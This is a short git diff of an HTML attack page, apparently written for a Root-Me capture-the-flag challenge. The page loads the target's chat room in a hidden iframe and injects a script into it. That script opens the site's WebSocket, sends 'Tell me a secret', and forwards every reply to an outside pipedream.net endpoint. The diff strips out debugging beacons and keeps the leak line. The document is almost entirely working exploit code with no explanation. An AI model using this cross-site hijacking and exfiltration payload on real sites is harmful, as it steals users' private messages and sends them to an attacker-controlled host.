@@ -4,30 +4,22 @@
   <iframe id="chatframe" src="http://ctf20.root-me.org/room" style="display:none;"></iframe>
 
   <script>
-     fetch('http://eo1gpdjxqwwogrz.m.pipedream.net/start1');
-    const iframe = document.getElementById('chatframe');
+    var myiframe = document.getElementById('chatframe');
 
-    iframe.onload = () => {
-      fetch('http://eo1gpdjxqwwogrz.m.pipedream.net/loaded-frame');
-      const script = iframe.contentWindow.document.createElement('script');
+    myiframe.onload = () => {
+      const script = myiframe.contentWindow.document.createElement('script');
       script.textContent = `
         
         const ws = new WebSocket('ws://ctf20.root-me.org/ws');
-        fetch('http://eo1gpdjxqwwogrz.m.pipedream.net/start2');
         ws.addEventListener('open', () => {
-          fetch('http://eo1gpdjxqwwogrz.m.pipedream.net/ws-opened');
           ws.send("Tell me a secret");
-        });
-
-        ws.addEventListener('error', () => {
-          fetch('http://eo1gpdjxqwwogrz.m.pipedream.net/ws-error');
         });
 
         ws.addEventListener('message', (event) => {
           fetch('http://eo1gpdjxqwwogrz.m.pipedream.net/leak?' + encodeURIComponent(event.data));
         });
       `;
-      iframe.contentWindow.document.body.appendChild(script);
+      myiframe.contentWindow.document.body.appendChild(script);
     };
   </script>
 </body>
